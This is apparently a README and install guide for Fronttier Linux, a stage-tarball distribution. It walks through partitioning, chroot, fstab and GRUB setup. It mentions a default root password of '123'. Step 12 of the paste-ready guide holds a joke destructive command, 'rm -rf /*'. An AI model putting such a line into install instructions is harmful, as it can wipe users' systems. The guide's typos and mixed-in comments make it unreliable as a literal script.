# FronttierLinux
Smaller than everything that can do what it does.

## What is it?

Fronttier Linux is a from-scratch LFS-based distrbution shipped as a
stage tarball like Gentoo. -install IT, Use it, that's it.

- less than 300MB** Smallest tarbal ever ~ (Gentoo systemd stage: 500+ MB)
- systemd** and **runit** in one Tarbal
- Full source toolchain**: gcc, headers, Python, Perl, cmake
- **will add** a void ENV for FronttierLinux in the near future
- **x86_64 only** (64-bit Intel or AMD)
- 32-bit x86, ARM, and RISC-V are **not supported** yet.


## Install

See the install guide below.

## Source vs release

- **This repo** contains scripts, configs, and docs. >> https://github.com/FronttierLabs/FronttierLinux/tags
- **The stage tarball** lives in GitHub Releases.

## Licenses

- scripts: GPL-3.0-or-later ('LICENSE')
- documentation: CC BY-SA 4.0
- Bundled third-party software: see 'THIRD_PARTY_LICENSES.md'



## install /guide
```bash
# Fronttier Linux — Stage Tarball Install Guide

## 1. Boot a live Gentoo ISO
Boot the Gentoo ISO in UEFI mode.

## 2. Download Fronttier
wget https://github.com/FronttierLabs/FronttierLinux/releases/download/oposum_v0.34/fronttier.tar.xz #Download the tarball in root directory


## 3. Pick the target disk
sudo -i
lsblk          # confirm the disk name, e.g. /dev/sda or /dev/nvme0n1 or /dev/vda

## 4. Partition (UEFI)
cfdisk /dev/sdX          # create:
                         #   Type: EFI System Partition, size >= 1012M
                         #   Type: Linux filesystem,    size >= 10G

                         ## 5. Format
export DISK=/dev/sdX            # CHANGE THIS
export PART1=${DISK}1 MUST BE EFI # or ${DISK}p1 for nvme
export PART2=${DISK}2 MUST BE ROOT # or ${DISK}p2

mkfs.fat  -F32 -n ESP  "$PART1"
mkfs.ext4 -L FronttierRoot -F   "$PART2"

## 6. Extract and mount disks
mount "$PART2" /mnt
mkdir -p /mnt/boot/efi
mount "$PART1" /mnt/boot/efi
tar -xJpf fronttier.tar.xz -C /mnt --numeric-owner

# CRITICAL: recreate the excluded mount points BEFORE chroot binds
mkdir -p /mnt/{proc,sys,dev,run,tmp,mnt,media}
chmod 1777 /mnt/tmp

## 7. Chroot
mount --rbind /dev  /mnt/dev  && mount --make-rslave /mnt/dev
mount --rbind /sys  /mnt/sys  && mount --make-rslave /mnt/sys
mount --rbind /proc /mnt/proc && mount --make-rslave /mnt/proc
mount -t tmpfs tmpfs /mnt/run

cp /etc/resolv.conf /mnt/etc/resolv.conf
chroot /mnt /bin/bash        # bash is on the host; zsh is not in the base tarball

## 8. Configure (inside chroot)
echo fronttier > /etc/hostname
ln -sf /usr/share/zoneinfo/America/New_York /etc/localtime # or your time zone

passwd root                  # set a real password, default passwd is 123

export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

groupadd storage
useradd -m -G wheel,audio,video,storage -s /bin/bash "user"
passwd "user"

# fstab: find the UUIDs
lsblk

## 9. Write fstab (inside chroot)
nano /etc/fstab

# Begin /etc/fstab

# file system  mount-point    type     options             dump  fsck
#                                                                order
#
#right now its supposed to look somewhat like what is under this text and you need to edit the disks which is kinda obv
#

# Begin /etc/fstab

/dev/sdXx    /              ext4     defaults                            1     1
/dev/sdXx  /boot/efi      vfat     defaults                           0     2
proc           /proc          proc     nosuid,noexec,nodev       0     0
sysfs          /sys           sysfs    nosuid,noexec,nodev        0     0
devpts       /dev/pts       devpts   gid=5,mode=620         0     0
tmpfs         /run           tmpfs    defaults                           0     0
devtmpfs  /dev           devtmpfs mode=0755,nosuid       0     0
tmpfs        /dev/shm       tmpfs    nosuid,nodev                0     0
cgroup2    /sys/fs/cgroup cgroup2  nosuid,noexec,nodev 0     0

# End /etc/fstab

## 10. Bootloader (inside chroot)
grub-install --target=x86_64-efi \
             --efi-directory=/boot/efi \
             --bootloader-id=Fronttier \
             --recheck --removable
grub-mkconfig -o /boot/grub/grub.cfg

exit

## 11. Reboot
umount -R /mnt 
reboot

###12. remove the USB from the port and boot onto the INIT of your choice
dau rm -rf /* # ;)

###optional
after login of the non root user you must setup ZSH if you will use zsh so simply enter "zsh" in in tty after login


```


